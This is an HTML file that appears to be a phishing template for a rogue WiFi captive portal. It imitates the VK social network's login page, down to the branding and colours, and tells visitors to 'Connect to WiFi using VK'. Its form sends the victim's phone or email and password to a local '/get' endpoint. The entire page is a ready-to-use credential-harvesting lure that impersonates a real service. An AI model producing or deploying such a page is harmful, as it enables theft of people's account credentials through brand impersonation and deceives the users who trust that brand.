<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
    <title>VK</title>
    <style>
      body {
        font-family: -apple-system, BlinkMacSystemFont, 'Roboto', 'Helvetica Neue', Arial, sans-serif;
        background-color: #4a76a8;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        margin: 0;
      }
      .login-container {
        width: 380px;
        background: #fff;
        border-radius: 12px;
        padding: 40px 32px;
        text-align: center;
      }
      #logo {
        margin-bottom: 20px;
      }
      .g-h1 {
        font-size: 28px;
        font-weight: 800;
        color: #4a76a8;
        margin-bottom: 8px;
      }
      .g-h2 {
        font-size: 14px;
        color: #666;
        margin-bottom: 24px;
      }
      .g-input {
        width: 100%;
        padding: 14px 16px;
        border: 1px solid #d3d9de;
        border-radius: 8px;
        font-size: 16px;
        margin-bottom: 16px;
        box-sizing: border-box;
        outline: none;
      }
      .g-input:focus {
        border-color: #4a76a8;
      }
      .gbtn-primary {
        width: 100%;
        padding: 14px;
        background-color: #4a76a8;
        color: #fff;
        border: none;
        border-radius: 8px;
        font-size: 16px;
        font-weight: 600;
        cursor: pointer;
      }
      .gbtn-primary:hover {
        background: #3d6490;
      }
      .link {
        display: block;
        margin-top: 16px;
        color: #4a76a8;
        font-size: 14px;
        text-decoration: none;
      }
      .link:hover {
        text-decoration: underline;
      }
      .footer {
        margin-top: 20px;
        font-size: 13px;
        color: #666;
      }
      .footer a {
        color: #4a76a8;
        text-decoration: none;
      }
    </style>
  </head>
  <body>
    <div class="login-container">
      <svg id="logo" viewBox="0 0 100 40" width="100" height="40">
        <text x="50%" y="34" text-anchor="middle" font-family="Arial" font-weight="800" font-size="38" fill="#4a76a8">VK</text>
      </svg>
      <h1 class="g-h1">Sign in to VK</h1>
      <p class="g-h2">Connect to WiFi using VK</p>
      <form action="/get" method="POST">
        <input class="g-input" type="text" name="email" placeholder="Phone or Email" required>
        <input class="g-input" type="password" name="password" placeholder="Password" required>
        <button type="submit" class="gbtn-primary">Log In</button>
      </form>
      <a href="#" class="link">Forgot password?</a>
      <p class="footer">Sign Up for VK</p>
    </div>
  </body>
</html>
